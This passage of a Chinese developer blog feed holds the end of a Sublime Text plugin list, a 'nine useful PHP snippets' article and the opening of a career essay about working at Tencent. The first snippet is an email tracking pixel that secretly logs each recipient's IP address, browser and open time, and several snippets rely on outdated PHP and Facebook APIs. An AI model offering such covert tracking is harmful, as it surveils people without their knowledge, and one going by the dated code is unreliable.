<h2 id="7-SublimeLinter"><a href="#7-SublimeLinter" class="headerlink" title="7. SublimeLinter"></a>7. SublimeLinter</h2><p>SublimeLinter 是少数几个能在 sublime text 3 工作的代码检查插件，SublimeLinter 支持 javascript、CSS、HTML、Java、PHP、Python、Ruby 等十多种开发语言，但前提是需要配置相应语言的环境，要检查 javascript 代码需要安装 node.js，检查 PHP 代码需要安装 PHP 并配置环境等。SublimeLinter 可以及时提示编写代码中存在的不规范和错误的写法，并培养我们良好的编码习惯和风格。</p>
<p>地址：<span class="exturl" data-url="aHR0cDovL3d3dy5zdWJsaW1lbGludGVyLmNvbS9lbi9sYXRlc3QvIw==">http://www.sublimelinter.com/en/latest/#<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="8-Alignment"><a href="#8-Alignment" class="headerlink" title="8. Alignment"></a>8. Alignment</h2><p>Aligment 插件让开发者自动对齐代码，包括 PHP、CSS、javascript 语言。使得代码看起来更整齐美观，更具可读性。</p>
<p>地址：<span class="exturl" data-url="aHR0cDovL3d3dy5jb2RlYWxpZ25tZW50LmNvbS8=">http://www.codealignment.com/<i class="fa fa-external-link-alt"></i></span></p>
<p>Sublime Text 3 中的插件种类繁复，功能强大，以上是开发者最常用的 8 大插件，希望给各位开发者节省插件选择的时间，提供编写代码的效率。</p>
]]></content>
      <categories>
        <category>DevTools</category>
      </categories>
      <tags>
        <tag>Sublime</tag>
      </tags>
  </entry>
  <entry>
    <title>开发者必备，超实用的 PHP 代码片段！</title>
    <url>/2018/04/php-coding/</url>
    <content><![CDATA[<h2 id="九个超级有用的-PHP-代码片段"><a href="#九个超级有用的-PHP-代码片段" class="headerlink" title="九个超级有用的 PHP 代码片段"></a>九个超级有用的 PHP 代码片段</h2><p>此前，研发频道曾发布《直接拿来用，10 个 PHP 代码片段》，得到了网友们的一致好评。</p>
<p>本文，笔者将继续分享九个超级有用的 PHP 代码片段。当你在开发网站、应用或者博客时，利用这些代码能为你节省大量的时间。</p>
<span id="more"></span>

<h2 id="一、查看邮件是否已被阅读"><a href="#一、查看邮件是否已被阅读" class="headerlink" title="一、查看邮件是否已被阅读"></a>一、查看邮件是否已被阅读</h2><p>当你在发送邮件时，你或许很想知道该邮件是否被对方已阅读。这里有段非常有趣的代码片段能够显示对方 IP 地址记录阅读的实际日期和时间。 </p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">Header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Get IP</span></span><br><span class="line"><span class="keyword">if</span> (!empty($_SERVER[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">  $ip=$_SERVER[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">elseif (!empty($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">  $ip=$_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  $ip=$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Time</span></span><br><span class="line">$actual_time = time();</span><br><span class="line">$actual_day = <span class="keyword">date</span>(<span class="string">&#x27;Y.m.d&#x27;</span>, $actual_time);</span><br><span class="line">$actual_day_chart = <span class="keyword">date</span>(<span class="string">&#x27;d/m/y&#x27;</span>, $actual_time);</span><br><span class="line">$actual_hour = <span class="keyword">date</span>(<span class="string">&#x27;H:i:s&#x27;</span>, $actual_time);</span><br><span class="line"></span><br><span class="line"><span class="comment">//GET Browser</span></span><br><span class="line">$browser = $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">    </span><br><span class="line"><span class="comment">//LOG</span></span><br><span class="line">$myFile = <span class="string">&quot;log.txt&quot;</span>;</span><br><span class="line">$fh = <span class="keyword">fopen</span>($myFile, <span class="string">&#x27;a+&#x27;</span>);</span><br><span class="line">$stringData = $actual_day . <span class="string">&#x27; &#x27;</span> . $actual_hour . <span class="string">&#x27; &#x27;</span> . $ip . <span class="string">&#x27; &#x27;</span> . $browser . <span class="string">&#x27; &#x27;</span> . <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">fwrite</span>($fh, $stringData);</span><br><span class="line"><span class="keyword">fclose</span>($fh);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Generate Image (Es. dimesion is 1x1)</span></span><br><span class="line">$newimage = ImageCreate(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">$grigio = ImageColorAllocate($newimage,<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>);</span><br><span class="line">ImageJPEG($newimage);</span><br><span class="line">ImageDestroy($newimage);</span><br><span class="line">	</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="二、从网页中提取关键字"><a href="#二、从网页中提取关键字" class="headerlink" title="二、从网页中提取关键字"></a>二、从网页中提取关键字</h2><p>一段伟大的代码片段能够轻松的从网页中提取关键字。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$meta = get_meta_tags(<span class="string">&#x27;http://www.emoticode.net/&#x27;</span>);</span><br><span class="line">$keywords = $meta[<span class="string">&#x27;keywords&#x27;</span>];</span><br><span class="line"><span class="regexp">//</span> Split keywords</span><br><span class="line">$keywords = explode(<span class="string">&#x27;,&#x27;</span>, $keywords );</span><br><span class="line"><span class="regexp">//</span> Trim them</span><br><span class="line">$keywords = array_map( <span class="string">&#x27;trim&#x27;</span>, $keywords );</span><br><span class="line"><span class="regexp">//</span> Remove empty <span class="keyword">values</span></span><br><span class="line">$keywords = array_filter( $keywords );</span><br><span class="line"></span><br><span class="line">print_r( $keywords );</span><br></pre></td></tr></table></figure>

<h2 id="三、查找页面上的所有链接"><a href="#三、查找页面上的所有链接" class="headerlink" title="三、查找页面上的所有链接"></a>三、查找页面上的所有链接</h2><p>使用 DOM，你可以轻松从任何页面上抓取链接，代码示例如下： </p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line"><span class="variable">$html</span> = file_get_contents(<span class="string">&#x27;http://www.example.com&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="type">DOMDocument</span>();</span><br><span class="line"><span class="meta">@$dom-&gt;loadHTML</span>(<span class="variable">$html</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// grab all the on the page</span></span><br><span class="line"><span class="variable">$xpath</span> = <span class="keyword">new</span> <span class="type">DOMXPath</span>(<span class="variable">$dom</span>);</span><br><span class="line"><span class="variable">$hrefs</span> = <span class="variable">$xpath</span>-&gt;evaluate(<span class="string">&quot;/html/body//a&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$hrefs</span>-&gt;length; <span class="variable">$i</span>++) &#123;</span><br><span class="line">       <span class="variable">$href</span> = <span class="variable">$hrefs</span>-&gt;item(<span class="variable">$i</span>);</span><br><span class="line">       <span class="variable">$url</span> = <span class="variable">$href</span>-&gt;getAttribute(<span class="string">&#x27;href&#x27;</span>);</span><br><span class="line">       echo <span class="variable">$url</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="四、自动转换-URL，跳转至超链接"><a href="#四、自动转换-URL，跳转至超链接" class="headerlink" title="四、自动转换 URL，跳转至超链接"></a>四、自动转换 URL，跳转至超链接</h2><p>在 WordPress 中，如果你想自动转换 URL，跳转至超链接页面，你可以利用内置的函数 make_clickable () 执行此操作。如果你想基于 WordPress 之外操作该程序，那么你可以参考 wp-includes&#x2F;formatting.php 源代码。 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_make_url_clickable_cb</span>(<span class="params"><span class="variable">$matches</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$url</span> = <span class="variable">$matches</span>[<span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> ( <span class="keyword">empty</span>(<span class="variable">$url</span>) )</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$matches</span>[<span class="number">0</span>];</span><br><span class="line">	<span class="comment">// removed trailing [.,;:] from URL</span></span><br><span class="line">	<span class="keyword">if</span> ( <span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$url</span>, -<span class="number">1</span>), <span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;:&#x27;</span>)) === <span class="literal">true</span> ) &#123;</span><br><span class="line">		<span class="variable">$ret</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$url</span>, -<span class="number">1</span>);</span><br><span class="line">		<span class="variable">$url</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$url</span>, <span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$url</span>)-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$matches</span>[<span class="number">1</span>] . <span class="string">&quot;&lt;a href=\&quot;<span class="subst">$url</span>\&quot; rel=\&quot;nofollow\&quot;&gt;<span class="subst">$url</span>&lt;/a&gt;&quot;</span> . <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_make_web_ftp_clickable_cb</span>(<span class="params"><span class="variable">$matches</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$dest</span> = <span class="variable">$matches</span>[<span class="number">2</span>];</span><br><span class="line">	<span class="variable">$dest</span> = <span class="string">&#x27;http://&#x27;</span> . <span class="variable">$dest</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> ( <span class="keyword">empty</span>(<span class="variable">$dest</span>) )</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$matches</span>[<span class="number">0</span>];</span><br><span class="line">	<span class="comment">// removed trailing [,;:] from URL</span></span><br><span class="line">	<span class="keyword">if</span> ( <span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$dest</span>, -<span class="number">1</span>), <span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;:&#x27;</span>)) === <span class="literal">true</span> ) &#123;</span><br><span class="line">		<span class="variable">$ret</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$dest</span>, -<span class="number">1</span>);</span><br><span class="line">		<span class="variable">$dest</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$dest</span>, <span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$dest</span>)-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$matches</span>[<span class="number">1</span>] . <span class="string">&quot;&lt;a href=\&quot;<span class="subst">$dest</span>\&quot; rel=\&quot;nofollow\&quot;&gt;<span class="subst">$dest</span>&lt;/a&gt;&quot;</span> . <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_make_email_clickable_cb</span>(<span class="params"><span class="variable">$matches</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$email</span> = <span class="variable">$matches</span>[<span class="number">2</span>] . <span class="string">&#x27;@&#x27;</span> . <span class="variable">$matches</span>[<span class="number">3</span>];</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$matches</span>[<span class="number">1</span>] . <span class="string">&quot;&lt;a href=\&quot;mailto:<span class="subst">$email</span>\&quot;&gt;<span class="subst">$email</span>&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_clickable</span>(<span class="params"><span class="variable">$ret</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="string">&#x27; &#x27;</span> . <span class="variable">$ret</span>;</span><br><span class="line">	<span class="comment">// in testing, using arrays here was found to be faster</span></span><br><span class="line">	<span class="variable">$ret</span> = <span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&#x27;#([\s&gt;])([\w]+?://[\w\\x80-\\xff\#$%&amp;~/.\-;:=,?@\[\]+]*)#is&#x27;</span>, <span class="string">&#x27;_make_url_clickable_cb&#x27;</span>, <span class="variable">$ret</span>);</span><br><span class="line">	<span class="variable">$ret</span> = <span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&#x27;#([\s&gt;])((www|ftp)\.[\w\\x80-\\xff\#$%&amp;~/.\-;:=,?@\[\]+]*)#is&#x27;</span>, <span class="string">&#x27;_make_web_ftp_clickable_cb&#x27;</span>, <span class="variable">$ret</span>);</span><br><span class="line">	<span class="variable">$ret</span> = <span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&#x27;#([\s&gt;])([.0-9a-z_+-]+)@(([0-9a-z-]+\.)+[0-9a-z]&#123;2,&#125;)#i&#x27;</span>, <span class="string">&#x27;_make_email_clickable_cb&#x27;</span>, <span class="variable">$ret</span>);</span><br><span class="line"> </span><br><span class="line">	<span class="comment">// this one is not in an array because we need it to run last, for cleanup of accidental links within links</span></span><br><span class="line">	<span class="variable">$ret</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;#(&lt;a( [^&gt;]+?&gt;|&gt;))&lt;a [^&gt;]+?&gt;([^&gt;]+?)&lt;/a&gt;&lt;/a&gt;#i&quot;</span>, <span class="string">&quot;<span class="subst">$1</span><span class="subst">$3</span>&lt;/a&gt;&quot;</span>, <span class="variable">$ret</span>);</span><br><span class="line">	<span class="variable">$ret</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$ret</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="五、创建数据-URL"><a href="#五、创建数据-URL" class="headerlink" title="五、创建数据 URL"></a>五、创建数据 URL</h2><p>数据 URL 可以直接嵌入到 HTML&#x2F;CSS&#x2F;JS 中，以节省大量的 HTTP 请求。 下面的这段代码可利用 $file 轻松创建数据 URL。 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">data_uri</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$mime</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$contents</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">  <span class="variable">$base64</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$contents</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;data:<span class="subst">$mime</span>;base64,<span class="subst">$base64</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="六、从服务器上下载-保存一个远程图片"><a href="#六、从服务器上下载-保存一个远程图片" class="headerlink" title="六、从服务器上下载 &amp; 保存一个远程图片"></a>六、从服务器上下载 &amp; 保存一个远程图片</h2><p>当你在搭建网站时，从远程服务器下载某张图片并且将其保存在自己的服务器上，这一操作会经常用到。代码如下：</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$image</span> = file_get_contents(<span class="string">&#x27;http://www.url.com/image.jpg&#x27;</span>);</span><br><span class="line">file_put_contents(<span class="string">&#x27;/images/image.jpg&#x27;</span>, <span class="symbol">$image</span>); <span class="comment">//Where to save the image</span></span><br></pre></td></tr></table></figure>

<h2 id="七、移除-Remove-Microsoft-Word-HTML-Tag"><a href="#七、移除-Remove-Microsoft-Word-HTML-Tag" class="headerlink" title="七、移除 Remove Microsoft Word HTML Tag"></a>七、移除 Remove Microsoft Word HTML Tag</h2><p>当你使用 Microsoft Word 会创建许多 Tag，比如 font，span，style，class 等。这些标签对于 Word 本身而言是非常有用的，但是当你从 Word 粘贴至网页时，你会发现很多无用的 Tag。因此，下面的这段代码可帮助你删除所有无用的 Word HTML Tag。 </p>
<figure class="highlight cos"><table><tr><td class="code"><pre><span class="line">function cleanHTML(<span class="built_in">$html</span>) &#123;</span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Removes all FONT and SPAN tags, and all Class and Style attributes.</span></span><br><span class="line"><span class="comment">/// Designed to get rid of non-standard Microsoft Word HTML tags.</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">// start by completely removing all unwanted tags</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">$html</span> = ereg_replace(<span class="string">&quot;&lt;(/)?(font|span|del|ins)[^&gt;]*&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="built_in">$html</span>)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// then run another pass over the html (twice), removing unwanted attributes</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">$html</span> = ereg_replace(<span class="string">&quot;&lt;([^&gt;]*)(class|lang|style|size|face)=(&quot;</span>[^<span class="string">&quot;]*&quot;</span>|&#x27;[^&#x27;]*&#x27;|[^&gt;]+)([^&gt;]*)&gt;<span class="string">&quot;,&quot;</span>&lt;\<span class="number">1</span>&gt;<span class="string">&quot;,$html);</span></span><br><span class="line"><span class="string">$html = ereg_replace(&quot;</span>&lt;([^&gt;]*)(<span class="keyword">class</span>|lang|style|size|face)=(<span class="string">&quot;[^&quot;</span>]*<span class="string">&quot;|&#x27;[^&#x27;]*&#x27;|[^&gt;]+)([^&gt;]*)&gt;&quot;</span>,<span class="string">&quot;&lt;\1&gt;&quot;</span>,<span class="built_in">$html</span>)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">$html</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="八、检测浏览器语言"><a href="#八、检测浏览器语言" class="headerlink" title="八、检测浏览器语言"></a>八、检测浏览器语言</h2><p>如果你的网站上有多种语言，那么可以使用这段代码作为默认的语言来检测浏览器语言。该段代码将返回浏览器客户端使用的初始语言。 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_client_language</span>(<span class="params"><span class="variable">$availableLanguages</span>, <span class="variable">$default</span>=<span class="string">&#x27;en&#x27;</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>])) &#123;</span><br><span class="line">		<span class="variable">$langs</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$langs</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">			<span class="variable">$choice</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$choice</span>, <span class="variable">$availableLanguages</span>))&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="variable">$choice</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="九、显示-Facebook-粉丝数量"><a href="#九、显示-Facebook-粉丝数量" class="headerlink" title="九、显示 Facebook 粉丝数量"></a>九、显示 Facebook 粉丝数量</h2><p>如果你的网站或者博客上有内链的 Facebook 页面，你或许想知道拥有多少粉丝。这段代码将帮助你查看 Facebook 粉丝数，记住，别忘了在你的页面 ID 第二行添加该段代码。 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$page_id</span> = <span class="string">&quot;YOUR PAGE-ID&quot;</span>;</span><br><span class="line">	<span class="variable">$xml</span> = @<span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&quot;http://api.facebook.com/restserver.php?method=facebook.fql.query&amp;query=SELECT%20fan_count%20FROM%20page%20WHERE%20page_id=&quot;</span>.<span class="variable">$page_id</span>.<span class="string">&quot;&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;a lot&quot;</span>);</span><br><span class="line">	<span class="variable">$fans</span> = <span class="variable">$xml</span>-&gt;page-&gt;fan_count;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$fans</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
  </entry>
  <entry>
    <title>在腾讯的八年，我的职业思考</title>
    <url>/2018/08/career-thinking/</url>
    <content><![CDATA[<h1 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h1><p>　　今年是2018年，腾讯20周年。我30周岁，刚好在腾讯工作满8年。</p>
<p>　　我从来没有想过自己会在同一家公司工作8年。因为4年足以读完大学，6年能让小孩读完小学，8年漫长得不可思议。</p>
<span id="more"></span>

<p>　　2010年，我刚大学毕业，加入腾讯。那一天，学生思维的我，不免以学生的尺度定计划：三年的时间，我应该足够从这一所“社会大学”毕业吧。</p>
<p>　　因此，我追赶时间，以这个截止日为目标，第一年学习高效地完成工作，第二年学习带新人，第三年学习影响力，翻译了一本前端书，和一本设计书。</p>
<p>　　我一步步从助理UI工程师晋级到高级UI工程师，先是积极响应需求，后来主动找事情做。我低着头，做事情非常“用力”，自信能把交给我的事情都做得很好。</p>
<p>　　我的博客文章80%都是头三年写的，现在回头看有很多幼稚的想法，但持续想和写才能提高。反过来说，要是现在还觉得好，那才糟糕。</p>
<h2 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h2><p>　　2013年，三年之痒。我开始觉得日常工作毫无挑战，考评时连续“优秀”跟“超出预期”拿到手软，但与此同时，也迎来新的工作挑战。</p>
<p>　　那时，我的领导问我以后的发展意向，是想继续研究技术深度，还是管理团队。我说如果有机会，尽量管理团队吧。</p>
<p>　　因为以我的理解，并不存在两种选项。这个问题就像“给你加工资，好不好啊”一样没有意义。学而优则仕，骨干不去领导团队，可能有点不负责任（现在想来很自恋，呵呵）。</p>
<p>　　虽然给了领导这样的答复，也开始进行正式的管理培训，但我内心还恋恋不舍想保留一点匠人心态。</p>
<p>　　个人能力要继续提高，我就开辟新的赛道：影响力。</p>
<p>　　2014年我认真地投入到写作练习中，在“26岁总结”中写下这段文字：</p>
<p>　　“在很多场景下我们都需要写作，我们要写短小的RTX，长一点的邮件，以及更长一点的分享文章、博客和专栏。关于写作，我觉得最有趣的一个事实是，<strong>优秀的写作者跟平庸的写作者所能达到的效果相差百倍以上，比优秀程序员和平庸程序员之间的差别还大</strong>。”</p>
<p>　　“优秀的写作者的RTX就是能让对方明白他的目的，并且像施了魔咒一样去合作。优秀的写作者的邮件能让接受者感兴趣，清晰地知道信息。优秀的写作者写的博客能用一段话击中读者心理，情不自禁点右上角的“分享到朋友圈”……这种效果100个平庸的写作者都达不到。”</p>
<p>　　“写作者需要的除了文笔，还有逻辑思维、数据分析、麦肯锡金字塔理论、心理学等等几乎所有的知识……”</p>
<p>　　每个人每天都要阅读微信、朋友圈、新闻、读书、知乎、小视频……关于写作对个人能力的的重要性，我认为怎么强调都不为过。因为广义的写作、演讲和设计，它们有一个共同的关键内核，就是<strong>搞清楚你的听众是谁，他们已有哪些信息，缺乏哪些信息，你要以怎么样的顺序来传达你想让对方做的事情</strong>。讲得邪乎点，它们都是一种“心理操纵术”。</p>
<p>　　那怎么才能学好写作（或者演讲，或者设计）呢？</p>
<p>　　答案无趣但有效：持续写。</p>
<p>　　反复阅读写出来的文字，毫不吝啬地删除无用的信息，重新再写。</p>
<p>　　达芬奇说过一句话：“Simplicity is the ultimate form of sophistication（简洁是终极的复杂）”。海明威每天写作之前都会把前一天的稿再改一次。</p>
<p>　　我也这样做，一开始在自己博客上写水文、在豆瓣写书评，感觉不够。2014年2月，我加入豆瓣专栏计划，需要每周写一篇超过3000字的专栏文章，结束后能获得200元鼓励金。我就像一个缺乏运动的人，强行把自己推入马拉松赛道。</p>
<p>　　我的前几篇写的很业余，错别字、口水话、病句、缺主语、串主语、一逗到底、唠唠叨叨、层级和顺序不对……<strong>那也还是要写</strong>。几个月后，20篇文章的专栏完结了，我的文字水平稳定从30分提升到50分，接近及格。</p>
<p>　　因为专栏内容相对新颖（可能是国内首批系统写“全栈工程师”的思考的专栏），慢慢积累一些读者并每周追看。读者宽容并热情地在评论区给我纠错。</p>
<p>　　后来，人民邮电出版社的责编在豆瓣上看到了我，就约我写稿。他说我写的东西已经很多，也有一些脉络，可以再整理一下出书。又是一个新的挑战。</p>
<p>　　先答应再说吧。</p>
<p>　　写书的过程只能说勉力支撑，因为只有50分的文字水平，却要输出80分的质量。把第一章整理好之后发过去，收到返回的修正稿，变成了另一篇文章。责编很专业，没有吐槽，只是做客观订正。</p>
<p>　　我羞愧难当，因为痛恨给人添麻烦。我记住修改过的问题种类，文法上字斟句酌，保证同类的不再犯。</p>
<p>　　因为责编会看出文字上的问题，然后给我修剪枝丫，但保持大树根基稳定就是我自己的责任，对读者的责任。我还买来《麦肯锡教我的写作武器》，更系统地学习写作。</p>
<p>　　经过好多轮的校对，我终于可以坦然说出，差不多达到基本的标准了。后面的事情我在<span class="exturl" data-url="aHR0cHM6Ly95dWd1by51cy93ZWJsb2cvZnVsbC1zdGFjay1lbmdpbmVlci8=">“我出书了”<i class="fa fa-external-link-alt"></i></span>中也都写了。2015年8月，我的书出版了。我在豆瓣上也慎重给《Web全栈工程师的自我修养》打了4星。</p>
<h2 id="三、"><a href="#三、" class="headerlink" title="三、"></a>三、</h2><p>　　写作成长磕磕碰碰的同时，管理之路也迂回曲折。试着带一段时间团队之后，我在2014年正式成为团队管理者。</p>
<p>　　当时对于团队管理的职责抱有几个不成熟心态：</p>
<ol>
<li>管理比写代码更容易掌握，践行起来也更轻松</li>
<li>管理者门槛较低，相较于工程师缺乏核心竞争力，以后跳槽我还是要以工程师身份来定位</li>
<li>我喜欢专注做事情，不适合做管理</li>
<li>在工程师团队中，我要以最强的技术和努力来赢得尊重，我要有能力解决他们都解决不了的问题</li>
</ol>
<p>　　因此，从2014-2016虽然也通过努力收获了一些个人成长，但对团队领导来讲其实我是不称职的。</p>
<p>　　有一个明显不称职的表现就是，每到员工考核期间，我就很纠结痛苦。我不希望有员工拿低于预期的考评，也害怕面对下属沟通面谈，当面对着他说你的绩效低于预期。</p>
<p>　　我能自律勤奋，但我很难改变自己的观念。最难的是，我甚至不知道自己是否应该改变自己的观念（瞧，这就是为什么改变观念是最难的），还是说退回去做一个还不错的工程师好了。</p>
<p>　　我在这个观念段位大概停留了两年多，经过断断续续的实践、阅读、观察和自省，我终于升级了。期间纠结和思考过程可以从2014到2016的博客文章中可见一斑。</p>
<p>　　总之，升级后的我认为：</p>
<ol>
<li>管理比写代码（或任何一门硬技能）更难于掌握，这是我跟一些技术专家沟通得到的共识。硬技能的学习可以通过读书、培训班，甚至网络视频来学习，然后持续练习，越来越熟练，直到产生一个输出物。这非常简单，只要掌握了学习的方法，几个月就能学习一门硬技能。而管理的学习需要真实观念的转变，这个观念改变可能需要几年时间。</li>
<li>管理的核心观念是“管理者必须善于做有效的决策”。</li>
<li>管理者要注重组织对外的贡献。基于贡献来衡量每个人的绩效。</li>
</ol>
<p>　　我开始积极与团队沟通，日常中看到不符合要求的输出，我就会直截了当地说“<strong>这不行，达不到基本水准</strong>”。</p>
<p>　　虽然比较严格，但也没有看到团队氛围下降的情况。因为从员工角度来讲，虽然乐于处在一个人际关系融洽的团队中，但更大的述求是加入一个充满专业人士的团队。每人都能从其他人身上学到特定知识，每人表现都是专业的。</p>
<p>　　我不再担心员工考核，因为它是一个有效的管理工具。有些无法用言语传达到的信息，可以通过绩效考核来传达。而且平时对于低绩效的员工就要做好预期管理，言行一致员工就不会困惑。</p>
<h2 id="四、"><a href="#四、" class="headerlink" title="四、"></a>四、</h2><p>　　2017年，我慢慢成为一个资深的管理者。又一次对工作驾轻就熟时，再次迎来新的挑战——转换岗位，领导腾讯微云UX设计团队。</p>
<p>　　我喜欢这个挑战，一方面它确实是一个“很大挑战”，受虐症的我无法拒绝。另一方面我一直处于产品流程中偏后的位置，但也对前置的思考很感兴趣。</p>
<p>　　因此，我梳理了自己面临的挑战：</p>
<ol>
<li>之前领导的团队都是工程师，而现在的团队由交互设计师和视觉设计师组成。虽然管理的基本法是相通的，但新团队的成员还需要更多熟悉</li>
<li>自己的设计专业能力不够，尤其是在视觉上，无法给到“怎么做”的建议</li>
